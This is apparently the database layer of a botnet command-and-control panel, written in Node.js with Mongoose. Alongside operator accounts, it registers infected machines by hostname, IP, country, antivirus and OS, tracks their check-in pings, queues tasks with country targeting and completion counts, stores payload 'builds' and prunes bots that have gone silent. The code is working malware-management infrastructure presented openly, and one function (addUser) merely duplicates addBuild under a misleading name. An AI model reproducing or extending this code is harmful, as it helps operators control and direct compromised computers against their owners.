const mongoose = require('mongoose');
const bcrypt = require('bcrypt');
const config = require('../config');
const crypto = require('crypto');
const user = require('./models/user');
const bot = require('./models/bot');
const cache = require('../api/cache');

mongoose.set('strictQuery', true);
mongoose.connect(config.dbUri, {
    maxPoolSize: 10,
    serverSelectionTimeoutMS: 5000,
});

const User = mongoose.model('User', user);
const Bot = mongoose.model('Bot', bot);

const SALT_ROUNDS = 12;
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_TIME = 15 * 60 * 1000; // 15 minutes

async function createUser(username, password) {
    try {
        // Validate input
        if (!username || typeof username !== 'string' || username.length < 3) {
            throw new Error('Invalid username - minimum 3 characters');
        }
        if (!password || typeof password !== 'string' || password.length < 8) {
            throw new Error('Password must be at least 8 characters');
        }

        // Check if user exists
        const existingUser = await User.findOne({ username });
        if (existingUser) {
            throw new Error('User already exists');
        }

        // Hash password with bcrypt
        const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
        
        const newUser = new User({
            username: username,
            password: hashedPassword,
            encryptedKey: crypto.randomBytes(32).toString('hex'),
            tasks: [],
            builds: [],
            createdAt: new Date(),
            lastLogin: null,
            loginAttempts: 0,
            lockoutUntil: null
        });

        await newUser.save();
        cache.reset();
        
        return newUser._id;
    } catch (error) {
        throw new Error(`Failed to create user: ${error.message}`);
    }
}

async function getUser(id) {
    try {
        // Sanitize ID
        if (!mongoose.Types.ObjectId.isValid(id)) {
            return null;
        }

        const possible = await User.findById(id).select('-password').exec();
        return possible || null;
    } catch (error) {
        console.error(`Error fetching user: ${error.message}`);
        return null;
    }
}

async function verifyLogin(username, password) {
    try {
        // Validate inputs
        if (!username || !password) {
            return null;
        }

        const userDoc = await User.findOne({ username }).exec();
        
        if (!userDoc) {
            return null;
        }

        // Check if account is locked
        if (userDoc.lockoutUntil && userDoc.lockoutUntil > Date.now()) {
            throw new Error('Account temporarily locked due to failed login attempts. Try again later.');
        }

        // Compare passwords using bcrypt
        const passwordMatch = await bcrypt.compare(password, userDoc.password);
        
        if (passwordMatch) {
            // Reset login attempts on successful login
            userDoc.loginAttempts = 0;
            userDoc.lockoutUntil = null;
            userDoc.lastLogin = new Date();
            await userDoc.save();
            return userDoc;
        } else {
            // Increment failed login attempts
            userDoc.loginAttempts = (userDoc.loginAttempts || 0) + 1;
            
            // Lock account after MAX_LOGIN_ATTEMPTS failed attempts
            if (userDoc.loginAttempts >= MAX_LOGIN_ATTEMPTS) {
                userDoc.lockoutUntil = new Date(Date.now() + LOCKOUT_TIME);
            }
            
            await userDoc.save();
            return null;
        }
    } catch (error) {
        throw new Error(`Login verification failed: ${error.message}`);
    }
}

async function changePassword(username, oldPassword, newPassword) {
    try {
        // Validate inputs
        if (!username || !oldPassword || !newPassword) {
            throw new Error('Missing required fields');
        }

        if (newPassword.length < 8) {
            throw new Error('New password must be at least 8 characters');
        }

        if (oldPassword === newPassword) {
            throw new Error('New password must be different from current password');
        }

        const userDoc = await User.findOne({ username }).exec();
        if (!userDoc) {
            throw new Error('User not found');
        }

        // Verify old password
        const passwordMatch = await bcrypt.compare(oldPassword, userDoc.password);
        if (!passwordMatch) {
            throw new Error('Current password is incorrect');
        }

        // Hash new password
        const hashedPassword = await bcrypt.hash(newPassword, SALT_ROUNDS);
        userDoc.password = hashedPassword;
        userDoc.passwordChangedAt = new Date();
        await userDoc.save();
    } catch (error) {
        throw new Error(`Password change failed: ${error.message}`);
    }
}

async function addTask(username, goal, param, targeted, countries) {
    try {
        // Validate inputs
        if (!username || !goal) {
            throw new Error('Missing required fields: username and goal');
        }

        const userDoc = await User.findOne({ username }).exec();
        if (!userDoc) {
            throw new Error('User not found');
        }

        const taskId = new mongoose.Types.ObjectId();
        userDoc.tasks.push({
            _id: taskId,
            goal,
            param,
            date: Date.now(),
            targeted,
            completed: 0,
            countries,
            status: 'pending'
        });

        cache.reset();
        await userDoc.save();
        return userDoc;
    } catch (error) {
        throw new Error(`Failed to add task: ${error.message}`);
    }
}

async function addBuild(username, log, path) {
    try {
        // Validate inputs
        if (!username || !log || !path) {
            throw new Error('Missing required fields');
        }

        const userDoc = await User.findOne({ username }).exec();
        if (!userDoc) {
            throw new Error('User not found');
        }

        const buildId = new mongoose.Types.ObjectId();
        userDoc.builds.push({
            _id: buildId,
            date: Date.now(),
            log,
            path,
            status: 'completed'
        });

        await userDoc.save();
        return userDoc;
    } catch (error) {
        throw new Error(`Failed to add build: ${error.message}`);
    }
}

async function addUser(username, log, path) {
    try {
        // Validate inputs
        if (!username || !log || !path) {
            throw new Error('Missing required fields');
        }

        const userDoc = await User.findOne({ username }).exec();
        if (!userDoc) {
            throw new Error('User not found');
        }

        const buildId = new mongoose.Types.ObjectId();
        userDoc.builds.push({
            _id: buildId,
            date: Date.now(),
            log,
            path,
            status: 'completed'
        });

        await userDoc.save();
        return userDoc;
    } catch (error) {
        throw new Error(`Failed to add user build: ${error.message}`);
    }
}

async function userExist(username) {
    try {
        if (!username) {
            return false;
        }

        const user = await User.findOne({ username }).exec();
        return !!user;
    } catch (error) {
        console.error(`Error checking user existence: ${error.message}`);
        return false;
    }
}

async function addBot(ownerusername, hostname, ip, country, av, os) {
    try {
        // Validate inputs
        if (!ownerusername || !hostname || !ip) {
            throw new Error('Missing required fields');
        }

        // Validate IP format
        if (!isValidIP(ip)) {
            throw new Error('Invalid IP address format');
        }

        // Check user exists
        const userExists = await User.findOne({ username: ownerusername }).exec();
        if (!userExists) {
            throw new Error('User not found');
        }

        const newBot = new Bot({
            ownerusername,
            hostname,
            ip,
            country,
            av,
            os,
            firstStart: Date.now(),
            lastPing: Date.now(),
            status: 'active'
        });

        await newBot.save();
        return newBot._id;
    } catch (error) {
        throw new Error(`Failed to add bot: ${error.message}`);
    }
}

async function newPing(id) {
    try {
        if (!mongoose.Types.ObjectId.isValid(id)) {
            throw new Error('Invalid bot ID');
        }

        const botDoc = await Bot.findByIdAndUpdate(
            id,
            { lastPing: Date.now() },
            { new: true }
        );

        if (!botDoc) {
            throw new Error('Bot not found');
        }

        return botDoc;
    } catch (error) {
        throw new Error(`Failed to update ping: ${error.message}`);
    }
}

async function getTasks(username) {
    try {
        if (!username) {
            return null;
        }

        const possibleUsers = await User.findOne({ username }).lean().exec();
        return possibleUsers?.tasks || null;
    } catch (error) {
        console.error(`Error fetching tasks: ${error.message}`);
        return null;
    }
}

async function getBuilds(username) {
    try {
        if (!username) {
            return null;
        }

        const possibleUsers = await User.findOne({ username }).lean().exec();
        return possibleUsers?.builds || null;
    } catch (error) {
        console.error(`Error fetching builds: ${error.message}`);
        return null;
    }
}

async function getBots(username) {
    try {
        if (!username) {
            return [];
        }

        const bots = await Bot.find({ ownerusername: username }).lean().exec();
        return bots || [];
    } catch (error) {
        console.error(`Error fetching bots: ${error.message}`);
        return [];
    }
}

async function deleteBot(id) {
    try {
        if (!mongoose.Types.ObjectId.isValid(id)) {
            throw new Error('Invalid bot ID');
        }

        const result = await Bot.deleteOne({ _id: id });

        if (result.deletedCount === 0) {
            throw new Error('Bot not found');
        }

        return true;
    } catch (error) {
        throw new Error(`Failed to delete bot: ${error.message}`);
    }
}

async function deleteTask(id, username) {
    try {
        if (!mongoose.Types.ObjectId.isValid(id)) {
            throw new Error('Invalid task ID');
        }

        if (!username) {
            throw new Error('Username required');
        }

        const result = await User.findOneAndUpdate(
            { username },
            { $pull: { tasks: { _id: id } } },
            { new: true }
        );

        if (!result) {
            throw new Error('User not found');
        }

        return result;
    } catch (error) {
        throw new Error(`Failed to delete task: ${error.message}`);
    }
}

async function deleteBuild(id, username) {
    try {
        if (!mongoose.Types.ObjectId.isValid(id)) {
            throw new Error('Invalid build ID');
        }

        if (!username) {
            throw new Error('Username required');
        }

        const result = await User.findOneAndUpdate(
            { username },
            { $pull: { builds: { _id: id } } },
            { new: true }
        );

        if (!result) {
            throw new Error('User not found');
        }

        return result;
    } catch (error) {
        throw new Error(`Failed to delete build: ${error.message}`);
    }
}

async function addCompleted(id, taskid) {
    try {
        if (!mongoose.Types.ObjectId.isValid(id) || !mongoose.Types.ObjectId.isValid(taskid)) {
            throw new Error('Invalid ID format');
        }

        const result = await User.updateOne(
            { _id: id, 'tasks._id': taskid },
            { $inc: { 'tasks.$.completed': 1 } }
        );

        if (result.matchedCount === 0) {
            throw new Error('User or task not found');
        }

        return result;
    } catch (error) {
        throw new Error(`Failed to update task completion: ${error.message}`);
    }
}

async function getBuild(username, buildid) {
    try {
        if (!username || !buildid) {
            throw new Error('Missing required parameters');
        }

        if (!mongoose.Types.ObjectId.isValid(buildid)) {
            throw new Error('Invalid build ID');
        }

        const userDoc = await User.findOne({ username }).exec();
        if (!userDoc) {
            throw new Error('User not found');
        }

        const build = userDoc.builds.id(buildid);
        if (!build) {
            throw new Error('Build not found');
        }

        return build;
    } catch (error) {
        throw new Error(`Failed to retrieve build: ${error.message}`);
    }
}

async function clearOldBots() {
    try {
        const FIVE_DAYS_MS = 1000 * 60 * 60 * 24 * 5;
        const cutoffTime = Date.now() - FIVE_DAYS_MS;

        const result = await Bot.deleteMany({ lastPing: { $lt: cutoffTime } });
        console.log(`[DB] Cleared ${result.deletedCount} inactive bots`);
        return result.deletedCount;
    } catch (error) {
        console.error(`Error clearing old bots: ${error.message}`);
        return 0;
    }
}

function isValidIP(ip) {
    const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if (!ipv4Regex.test(ip)) return false;
    
    const parts = ip.split('.').map(Number);
    return parts.every(part => part >= 0 && part <= 255);
}

module.exports = {
    createUser,
    verifyLogin,
    addTask,
    addBot,
    addUser,
    getBuilds,
    getTasks,
    getBots,
    getBuild,
    userExist,
    addBuild,
    changePassword,
    deleteTask,
    deleteBuild,
    deleteBot,
    getUser,
    newPing,
    clearOldBots,
    addCompleted
};